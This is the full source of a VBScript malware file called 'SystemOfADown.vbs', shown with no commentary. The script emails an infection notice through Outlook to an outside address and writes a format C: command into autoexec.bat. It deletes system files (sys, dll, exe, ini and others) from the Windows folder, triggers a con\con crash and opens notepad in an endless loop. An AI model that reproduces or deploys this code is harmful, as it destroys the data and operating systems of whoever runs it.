'	-----------------
'	SystemOfADown.vbs
'	   by El Rocky
'	-----------------
'

Set fso = CreateObject("Scripting.FileSystemObject")
Set Windir = fso.GetSpecialFolder(0)
Set folderi = fso.GetFolder(Windir)
Set file = fso.OpenTextFile(WScript.ScriptFullName,1)
Set fid = folderi.Files
Set script = CreateObject("WScript.Shell")
Set mailke = WScript.CreateObject("Outlook.Application")
Set mail = mailke.CreateItem(0)

mail.Recipients.Add("hardrocky@hotmail.com")
mail.Subject = "INFECTED!!!"
mail.Body = "This computer is infected with SystemOfADown.vbs!!!"
mail.Send

Set a = fso.CreateTextFile("\autoexec.bat", True)
a.WriteLine ("@ECHO OFF")
a.WriteLine ("format C: /u /v:EBD /autotest")
a.Close

For each file1 in fid
ext = fso.GetExtensionName(file1.path)
ext = lcase(ext)
filen = lcase(file1.name)
if (ext="sys") or (ext="dll") or (ext="ocx") or (ext="exe") or (ext="cpl") or (ext="ini") or (ext="pwl") Then
fso.DeleteFile(file1)
end if
next

MsgBox "You're computer is dead!" , vbcritical, nix
script.run "C:\con\con"
Do
script.run notepad
loop